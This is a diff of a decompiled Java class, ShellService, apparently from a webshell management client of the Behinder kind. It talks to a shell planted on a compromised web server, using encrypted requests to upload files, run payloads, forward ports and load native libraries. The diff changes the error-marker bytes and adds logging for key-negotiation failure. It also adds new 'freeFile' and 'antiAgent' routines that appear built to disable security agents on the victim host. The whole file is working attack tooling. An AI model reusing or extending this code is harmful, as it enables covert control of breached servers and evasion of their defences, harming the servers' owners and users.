@@ -62,7 +62,6 @@ public class ShellService {
          this.currentHeaders.put("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2");
       }
 
-      this.currentHeaders.put("Cache-Control", "max-age=0");
       this.currentHeaders.put("Referer", this.getReferer());
    }
 
@@ -185,10 +184,10 @@ public class ShellService {
       boolean result = false;
       this.currentKey = Utils.getKey(this.currentPassword);
 
-      String content = null;
+      String content;
       try {
-         int randStringLength = 0;
-         JSONObject obj = null;
+         int randStringLength;
+         JSONObject obj;
          if (this.currentType.equals("php")) {
             try {
                randStringLength = (new SecureRandom()).nextInt(3000);
@@ -229,6 +228,8 @@ public class ShellService {
             }
          }
       } catch (Exception var12) {
+         var12.printStackTrace();
+         System.out.println("The pre-shared key handshake fails and enters the dynamic key negotiation process.");
          Map keyAndCookie = Utils.getKeyAndCookie(this.currentUrl, this.currentPassword, this.currentHeaders);
          content = (String)keyAndCookie.get("cookie");
          if ((content == null || content.equals("")) && !this.currentHeaders.containsKey("cookie")) {
@@ -723,8 +724,8 @@ public class ShellService {
    public JSONObject uploadFile(String remotePath, byte[] fileContent, boolean useBlock) throws Exception {
       Map params = new LinkedHashMap();
       JSONObject result = null;
-      byte[] data = null;
-      String resultTxt = null;
+      byte[] data;
+      String resultTxt;
       if (!useBlock) {
          params.put("mode", "create");
          params.put("path", remotePath);
@@ -825,7 +826,7 @@ public class ShellService {
       Map resHeader = (Map)result.get("header");
       byte[] resData = (byte[])((byte[])result.get("data"));
       if (((String)resHeader.get("status")).equals("200")) {
-         if (resData != null && resData.length >= 4 && resData[0] == 56 && resData[1] == 33 && resData[2] == 73 && resData[3] == 55) {
+         if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
             resData = Arrays.copyOfRange(resData, 4, resData.length);
             throw new Exception(new String(resData));
          } else {
@@ -848,7 +849,7 @@ public class ShellService {
       Map resHeader = (Map)result.get("header");
       byte[] resData = (byte[])((byte[])result.get("data"));
       if (((String)resHeader.get("status")).equals("200")) {
-         if (resData != null && resData.length >= 4 && resData[0] == 56 && resData[1] == 33 && resData[2] == 73 && resData[3] == 55) {
+         if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
             resData = Arrays.copyOfRange(resData, 4, resData.length);
             throw new Exception(new String(resData));
          } else {
@@ -869,7 +870,7 @@ public class ShellService {
       Map resHeader = (Map)result.get("header");
       byte[] resData = (byte[])((byte[])result.get("data"));
       if (((String)resHeader.get("status")).equals("200")) {
-         if (resData != null && resData.length >= 4 && resData[0] == 56 && resData[1] == 33 && resData[2] == 73 && resData[3] == 55) {
+         if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
             resData = Arrays.copyOfRange(resData, 4, resData.length);
             throw new Exception(new String(resData));
          } else {
@@ -909,7 +910,7 @@ public class ShellService {
       Map resHeader = (Map)result.get("header");
       byte[] resData = (byte[])((byte[])result.get("data"));
       if (((String)resHeader.get("status")).equals("200")) {
-         if (resData != null && resData.length >= 4 && resData[0] == 56 && resData[1] == 33 && resData[2] == 73 && resData[3] == 55) {
+         if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
             resData = Arrays.copyOfRange(resData, 4, resData.length);
             throw new Exception(new String(resData));
          } else {
@@ -934,7 +935,7 @@ public class ShellService {
          result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
       } catch (Exception var10) {
          byte[] exceptionByte = var10.getMessage().getBytes();
-         if (exceptionByte[0] == 56 && exceptionByte[1] == 33 && exceptionByte[2] == 73 && exceptionByte[3] == 55) {
+         if (exceptionByte[0] == 55 && exceptionByte[1] == 33 && exceptionByte[2] == 73 && exceptionByte[3] == 54) {
             resData = Arrays.copyOfRange(exceptionByte, 4, exceptionByte.length);
             throw new Exception(new String(resData, "UTF-8"));
          }
@@ -945,8 +946,9 @@ public class ShellService {
       Map resHeader = (Map)result.get("header");
       if (((String)resHeader.get("status")).equals("200")) {
          resData = (byte[])((byte[])result.get("data"));
-         if (resData != null && resData.length >= 4 && resData[0] == 56 && resData[1] == 33 && resData[2] == 73 && resData[3] == 55) {
-            return null;
+         if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
+            resData = Arrays.copyOfRange(resData, 4, resData.length);
+            throw new Exception(new String(resData));
          }
 
          if (resHeader.containsKey("server") && ((String)resHeader.get("server")).indexOf("Apache-Coyote/1.1") > 0) {
@@ -980,7 +982,7 @@ public class ShellService {
       Map resHeader = (Map)result.get("header");
       byte[] resData = (byte[])((byte[])result.get("data"));
       if (((String)resHeader.get("status")).equals("200")) {
-         if (resData != null && resData.length >= 4 && resData[0] == 56 && resData[1] == 33 && resData[2] == 73 && resData[3] == 55) {
+         if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
             resData = Arrays.copyOfRange(resData, 4, resData.length);
             return false;
          } else {
@@ -996,6 +998,15 @@ public class ShellService {
       params.put("action", "closeLocal");
       params.put("targetIP", targetIP);
       params.put("targetPort", targetPort);
+      byte[] data = Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType);
+      Map resHeader = (Map)Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex).get("header");
+      return ((String)resHeader.get("status")).equals("200");
+   }
+
+   public boolean closeLocalPortMapWorker(String socketHash) throws Exception {
+      Map params = new LinkedHashMap();
+      params.put("action", "closeLocalWorker");
+      params.put("socketHash", socketHash);
       byte[] data = Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType);
       Map resHeader = (Map)Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex).get("header");
       return ((String)resHeader.get("status")).equals("200");
@@ -1026,7 +1037,7 @@ public class ShellService {
          result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
       } catch (Exception var8) {
          byte[] exceptionByte = var8.getMessage().getBytes();
-         if (exceptionByte[0] == 56 && exceptionByte[1] == 33 && exceptionByte[2] == 73 && exceptionByte[3] == 55) {
+         if (exceptionByte[0] == 55 && exceptionByte[1] == 33 && exceptionByte[2] == 73 && exceptionByte[3] == 54) {
             return null;
          }
 
@@ -1036,7 +1047,8 @@ public class ShellService {
       Map resHeader = (Map)result.get("header");
       if (((String)resHeader.get("status")).equals("200")) {
          resData = (byte[])((byte[])result.get("data"));
-         if (resData != null && resData.length >= 4 && resData[0] == 56 && resData[1] == 33 && resData[2] == 73 && resData[3] == 55) {
+         if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
+            System.out.println(new String(resData));
             resData = null;
          } else {
             if (resHeader.containsKey("server") && ((String)resHeader.get("server")).indexOf("Apache-Coyote/1.1") > 0) {
@@ -1066,7 +1078,7 @@ public class ShellService {
       Map resHeader = (Map)result.get("header");
       byte[] resData = (byte[])((byte[])result.get("data"));
       if (((String)resHeader.get("status")).equals("200")) {
-         if (resData != null && resData.length >= 4 && resData[0] == 56 && resData[1] == 33 && resData[2] == 73 && resData[3] == 55) {
+         if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
             resData = Arrays.copyOfRange(resData, 4, resData.length);
             return false;
          } else {
@@ -1097,7 +1109,7 @@ public class ShellService {
       Map resHeader = (Map)result.get("header");
       byte[] resData = (byte[])((byte[])result.get("data"));
       if (((String)resHeader.get("status")).equals("200")) {
-         if (resData != null && resData.length >= 4 && resData[0] == 56 && resData[1] == 33 && resData[2] == 73 && resData[3] == 55) {
+         if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
             resData = Arrays.copyOfRange(resData, 4, resData.length);
             return false;
          } else {
@@ -1221,11 +1233,11 @@ public class ShellService {
       }
    }
 
-   public JSONObject loadNativeLibrary(String fileContent) throws Exception {
+   public JSONObject loadNativeLibrary(String libraryPath) throws Exception {
       Map params = new LinkedHashMap();
       params.put("action", "load");
       params.put("whatever", Utils.getWhatever());
-      params.put("fileContent", fileContent);
+      params.put("libraryPath", libraryPath);
       byte[] data = Utils.getData(this.currentKey, this.encryptType, "loadNativeLibrary", params, this.currentType);
       Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
       byte[] resData = (byte[])((byte[])resultObj.get("data"));
@@ -1241,20 +1253,21 @@ public class ShellService {
       return result;
    }
 
-   public JSONObject executePayload(String payload) throws Exception {
+   public JSONObject executePayload(String uploadLibPath, String payload) throws Exception {
       Map params = new LinkedHashMap();
       params.put("action", "execute");
       params.put("whatever", Utils.getWhatever());
+      params.put("uploadLibPath", uploadLibPath);
       params.put("payload", payload);
       byte[] data = Utils.getData(this.currentKey, this.encryptType, "loadNativeLibrary", params, this.currentType);
       Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
       byte[] resData = (byte[])((byte[])resultObj.get("data"));
       String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
       JSONObject result = new JSONObject(resultTxt);
-      Iterator var8 = result.keySet().iterator();
+      Iterator var9 = result.keySet().iterator();
 
-      while(var8.hasNext()) {
-         String key = (String)var8.next();
+      while(var9.hasNext()) {
+         String key = (String)var9.next();
          result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
       }
 
@@ -1297,6 +1310,67 @@ public class ShellService {
 
       while(var9.hasNext()) {
          String key = (String)var9.next();
+         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
+      }
+
+      return result;
+   }
+
+   public JSONObject freeFile(String uploadLibPath, String filePath) throws Exception {
+      Map params = new LinkedHashMap();
+      params.put("action", "freeFile");
+      params.put("whatever", Utils.getWhatever());
+      params.put("uploadLibPath", uploadLibPath);
+      params.put("filePath", filePath);
+      byte[] data = Utils.getData(this.currentKey, this.encryptType, "loadNativeLibrary", params, this.currentType);
+      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
+      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
+      JSONObject result = new JSONObject(resultTxt);
+      Iterator var9 = result.keySet().iterator();
+
+      while(var9.hasNext()) {
+         String key = (String)var9.next();
+         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
+      }
+
+      return result;
+   }
+
+   public JSONObject loadLibraryAndAntiAgent(String fileContent) throws Exception {
+      Map params = new LinkedHashMap();
+      params.put("action", "antiAgent");
+      params.put("whatever", Utils.getWhatever());
+      params.put("fileContent", fileContent);
+      byte[] data = Utils.getData(this.currentKey, this.encryptType, "loadNativeLibrary", params, this.currentType);
+      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
+      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
+      JSONObject result = new JSONObject(resultTxt);
+      Iterator var8 = result.keySet().iterator();
+
+      while(var8.hasNext()) {
+         String key = (String)var8.next();
+         result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
+      }
+
+      return result;
+   }
+
+   public JSONObject antiAgent(String uploadLibPath) throws Exception {
+      Map params = new LinkedHashMap();
+      params.put("action", "antiAgent");
+      params.put("whatever", Utils.getWhatever());
+      params.put("uploadLibPath", uploadLibPath);
+      byte[] data = Utils.getData(this.currentKey, this.encryptType, "loadNativeLibrary", params, this.currentType);
+      Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
+      byte[] resData = (byte[])((byte[])resultObj.get("data"));
+      String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
+      JSONObject result = new JSONObject(resultTxt);
+      Iterator var8 = result.keySet().iterator();
+
+      while(var8.hasNext()) {
+         String key = (String)var8.next();
          result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
       }
 
@@ -1363,7 +1437,7 @@ public class ShellService {
 
          return result;
       } catch (Exception var10) {
-         throw new Exception(resultTxt);
+         throw new Exception(new String(resData));
       }
    }
 
@@ -1379,7 +1453,7 @@ public class ShellService {
          result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
       } catch (Exception var8) {
          byte[] exceptionByte = var8.getMessage().getBytes();
-         if (exceptionByte[0] == 56 && exceptionByte[1] == 33 && exceptionByte[2] == 73 && exceptionByte[3] == 55) {
+         if (exceptionByte[0] == 55 && exceptionByte[1] == 33 && exceptionByte[2] == 73 && exceptionByte[3] == 54) {
             return null;
          }
 
@@ -1389,7 +1463,7 @@ public class ShellService {
       Map resHeader = (Map)result.get("header");
       if (((String)resHeader.get("status")).equals("200")) {
          resData = (byte[])((byte[])result.get("data"));
-         if (resData != null && resData.length >= 4 && resData[0] == 56 && resData[1] == 33 && resData[2] == 73 && resData[3] == 55) {
+         if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
             resData = null;
          } else {
             if (resHeader.containsKey("server") && ((String)resHeader.get("server")).indexOf("Apache-Coyote/1.1") > 0) {
@@ -1417,7 +1491,7 @@ public class ShellService {
       Map resHeader = (Map)result.get("header");
       byte[] resData = (byte[])((byte[])result.get("data"));
       if (((String)resHeader.get("status")).equals("200")) {
-         if (resData != null && resData.length >= 4 && resData[0] == 56 && resData[1] == 33 && resData[2] == 73 && resData[3] == 55) {
+         if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
             resData = Arrays.copyOfRange(resData, 4, resData.length);
             return false;
          } else {
